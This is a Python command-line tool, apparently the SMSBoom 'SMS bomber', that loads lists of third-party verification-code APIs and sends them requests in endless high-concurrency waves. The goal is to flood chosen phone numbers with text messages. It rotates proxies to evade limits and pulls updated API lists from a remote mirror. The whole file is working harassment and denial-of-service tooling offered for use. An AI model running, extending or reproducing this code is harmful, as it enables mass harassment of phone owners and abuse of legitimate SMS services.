import sys
import os
import click
from typing import Union
from utils.models import API
from utils.req import req_func, req_func_by_proxy, run_async, run_async_by_proxy
from concurrent.futures import ThreadPoolExecutor
from ProxySpider import ProxySpider
from pathlib import Path
from json import loads
from httpx import Client
from random import choice
from time import sleep
from asyncio import get_event_loop

# 確定應用程序係一個腳本文件或凍結EXE
if getattr(sys, 'frozen', False):
    path = os.path.dirname(sys.executable)
elif __file__:
    path = os.path.dirname(__file__)

headers = list()
if os.path.exists("useragents"):
    txt_list = os.listdir("useragents")
    for txt in txt_list:
        try:
            with open("./useragents/{}".format(txt), 'r', encoding="UTF-8") as f:
                headers.extend(f.read().split('\n'))
        except Exception:
            continue


@click.group()
def cli():
    pass


@click.command()
def update():
    """从 github 获取最新接口"""
    GETAPI_json_url = f"https://hk1.monika.love/OpenEthan/SMSBoom/master/GETAPI.json"
    API_json_url = f"https://hk1.monika.love/OpenEthan/SMSBoom/master/api.json"
    print("正在从GitHub拉取最新接口!")
    try:
        with Client(verify=False, timeout=10) as client:
            GETAPI_json = client.get(
                GETAPI_json_url, headers={'User-Agent': choice(headers)}).content.decode(encoding="utf8")
            api_json = client.get(
                API_json_url, headers={'User-Agent': choice(headers)}).content.decode(encoding="utf8")

    except Exception as e:
        print("拉取更新失败:{}请关闭所有代理软件多尝试几次!".format(e))

    else:
        with open(Path(path, "GETAPI.json").absolute(), mode="w", encoding="utf8") as a:
            a.write(GETAPI_json)
        with open(Path(path, "api.json").absolute(), mode="w", encoding="utf8") as a:
            a.write(api_json)

        print("接口更新成功!")


@click.command()
@click.option("--thread", "-t", help="线程数(默认64)", default=64)
@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.option('--interval', "-i", default=60, help="间隔时间(默认60s)", type=int)
@click.option('--proxies', "-e", default=10, help="一次攻击所需代理(默认10),不使用代理则设为0", type=int)
def run(thread: int, phone: Union[str, tuple], interval: int, proxies: int):
    """传入线程数和手机号启动轰炸,支持多手机号"""

    print("手机号:{}, 线程数:{}, 间隔时间:{}, 代理数:{}".format(phone, thread, interval, proxies))

    Spider = ProxySpider(proxies, proxypool_url='http://127.0.0.1:5555/random')

    try:
        """load json for api.json"""
        json_path = Path(path, 'api.json')
        if not json_path.exists():
            raise ValueError
        with open(json_path.resolve(), mode="r", encoding="utf8") as j:
            try:
                datas = loads(j.read())
                api = [API(**data) for data in datas]

            except Exception:
                raise ValueError

        """load json for GETAPI.json"""
        json_path = Path(path, 'GETAPI.json')
        if not json_path.exists():
            raise ValueError
        with open(json_path.resolve(), mode="r", encoding="utf8") as j:
            try:
                getapi = loads(j.read())
            except Exception:
                raise ValueError

    except ValueError:
        print("读取接口出错!正在重新下载接口数据!....")
        update()
        sys.exit(1)

    with ThreadPoolExecutor(max_workers=thread) as pool:
        i = 1
        while True:
            print("第{}波轰炸开始！".format(i))
            if proxies != 0:
                Spider.run()
                print("第{}波轰炸 - 当前正在使用代理{}, 进行轰炸...".format(i, Spider.ip_list))
                # {'all://': 'http://91.93.42.115:10001'}
                for value in api:
                    pool.submit(req_func_by_proxy, value, phone, {'http://': 'http://' + choice(Spider.ip_list)})

                for value in getapi:
                    pool.submit(req_func_by_proxy, value, phone, {'http://': 'http://' + choice(Spider.ip_list)})

                del ProxySpider.ip_list[:]
            else:
                print("第{}波开始轰炸...".format(i))
                for value in api:
                    pool.submit(req_func, value, phone)
                for value in getapi:
                    pool.submit(req_func, value, phone)

            print("第{}波轰炸提交结束！休息{}s.....".format(i, interval))
            i = i + 1
            sleep(interval)


@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.option('--interval', "-i", default=60, help="间隔时间(默认60s)", type=int)
@click.option('--proxies', "-e", is_flag=True, help="开启代理(默认关闭)", type=bool)
@click.command()
def async_run(phone: Union[str, tuple], interval: int, proxies: bool = False):
    """以最快的方式请求接口(真异步百万并发)"""

    print("手机号:{}, 间隔时间:{}, 是否开启代理:{}".format(phone, interval, proxies))

    """load json for api.json"""
    json_path = Path(path, 'api.json')
    if not json_path.exists():
        raise ValueError
    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = loads(j.read())
            api = [API(**data) for data in datas]

        except Exception:
            raise ValueError

    """load json for GETAPI.json"""
    json_path = Path(path, 'GETAPI.json')
    if not json_path.exists():
        raise ValueError
    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            getapi = loads(j.read())
        except Exception:
            raise ValueError

    apis = api + getapi
    Spider = ProxySpider(1, proxypool_url='http://127.0.0.1:5555/random')

    i = 1
    while True:
        print("第{}波轰炸开始！".format(i))
        if proxies:
            Spider.run()
            # {'http://': 'http://' + Spider.ip_list[-1]}
            proxy = {'http://': 'http://' + Spider.ip_list[-1]}
            print("第{}波轰炸 - 当前正在使用代理{}, 进行轰炸...".format(i, proxy))
            loop = get_event_loop()
            loop.run_until_complete(run_async_by_proxy(apis, phone, proxy))
            del Spider.ip_list[:]
        else:
            print("第{}波开始轰炸...".format(i))
            loop = get_event_loop()
            loop.run_until_complete(run_async(apis, phone))

        print("第{}波轰炸提交结束！休息{}s.....".format(i, interval))
        i = i + 1
        sleep(interval)


@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.command()
def one_run(phone: Union[str, tuple]):
    """单线程(测试使用)"""
    """load json for api.json"""
    json_path = Path(path, 'api.json')
    if not json_path.exists():
        raise ValueError
    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = loads(j.read())
            api = [API(**data) for data in datas]

        except Exception:
            raise ValueError

    """load json for GETAPI.json"""
    json_path = Path(path, 'GETAPI.json')
    if not json_path.exists():
        raise ValueError
    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            getapi = loads(j.read())
        except Exception:
            raise ValueError

    apis = api + getapi

    for api in apis:
        try:
            req_func(api, phone)
        except Exception as e:
            print(e)


cli.add_command(update)
cli.add_command(run)
cli.add_command(async_run)
cli.add_command(one_run)

if __name__ == '__main__':
    cli()
